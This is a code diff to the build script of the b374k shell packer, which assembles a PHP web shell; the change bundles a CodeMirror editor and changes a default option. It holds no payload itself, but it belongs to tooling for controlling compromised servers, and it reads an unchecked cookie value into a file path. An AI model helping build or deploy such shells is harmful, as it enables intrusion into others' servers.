@@ -10,6 +10,7 @@ $GLOBALS['packer']['title'] = "b374k shell packer";
 $GLOBALS['packer']['version'] = "0.4.2";
 $GLOBALS['packer']['base_dir'] = "./base/";
 $GLOBALS['packer']['module_dir'] = "./module/";
+$GLOBALS['packer']['codemirror'] = "./module/codemirror/";
 $GLOBALS['packer']['theme_dir'] = "./theme/";
 $GLOBALS['packer']['module'] = packer_get_module();
 $GLOBALS['packer']['theme'] = packer_get_theme();
@@ -26,14 +27,31 @@ $module_code = packer_read_file($GLOBALS['packer']['base_dir']."base.php");
 /* JAVASCRIPT AND CSS FILES START */
 $zepto_code = packer_read_file($GLOBALS['packer']['base_dir']."zepto.js");
 $js_main_code = "\n\n".packer_read_file($GLOBALS['packer']['base_dir']."main.js");
+$js_main_code .= "\n\n".packer_read_file($GLOBALS['packer']['base_dir']."custom-codemirror.js");
 
 $js_code = "\n\n".packer_read_file($GLOBALS['packer']['base_dir']."sortable.js").$js_main_code;
 $js_code .= "\n\n".packer_read_file($GLOBALS['packer']['base_dir']."base.js");
+/*
+$js_code .= "\n\n".packer_read_file($GLOBALS['packer']['codemirror']."lib/codemirror.js");
+$js_code .= "\n\n".packer_read_file($GLOBALS['packer']['codemirror']."addon/search/searchcursor.js");
+$js_code .= "\n\n".packer_read_file($GLOBALS['packer']['codemirror']."addon/dialog/dialog.js");
+$js_code .= "\n\n".packer_read_file($GLOBALS['packer']['codemirror']."keymap/vim.js");
+$js_code .= "\n\n".packer_read_file($GLOBALS['packer']['codemirror']."keymap/sublime.js");
+$js_code .= "\n\n".packer_read_file($GLOBALS['packer']['codemirror']."mode/htmlmixed/htmlmixed.js");
+$js_code .= "\n\n".packer_read_file($GLOBALS['packer']['codemirror']."mode/xml/xml.js");
+$js_code .= "\n\n".packer_read_file($GLOBALS['packer']['codemirror']."mode/javascript/javascript.js");
+$js_code .= "\n\n".packer_read_file($GLOBALS['packer']['codemirror']."mode/css/css.js");
+$js_code .= "\n\n".packer_read_file($GLOBALS['packer']['codemirror']."mode/clike/clike.js");
+$js_code .= "\n\n".packer_read_file($GLOBALS['packer']['codemirror']."mode/php/php.js");
+*/
 
 
 if(isset($_COOKIE['packer_theme']))	$theme = $_COOKIE['packer_theme'];
 else $theme ="default";
 $css_code = packer_read_file($GLOBALS['packer']['theme_dir'].$theme.".css");
+$css_code .="\n\n".packer_read_file($GLOBALS['packer']['codemirror']."lib/codemirror.css");
+$css_code .="\n\n".packer_read_file($GLOBALS['packer']['codemirror']."theme/monokai.css");
+$css_code .="\n\n".packer_read_file($GLOBALS['packer']['codemirror']."addon/dialog/dialog.css");
 
 /* JAVASCRIPT AND CSS FILES END */
 
@@ -159,8 +177,8 @@ if(isset($_SERVER['REMOTE_ADDR'])){
 			<?php echo $available_themes; ?>
 			<tr><td>Strip Comments and Whitespaces</td><td>
 				<select id='strip' style='width:150px;'>
-					<option selected="selected">yes</option>
-					<option>no</option>
+					<option>yes</option>
+					<option selected="selected">no</option>
 				</select>
 			</td></tr>
 
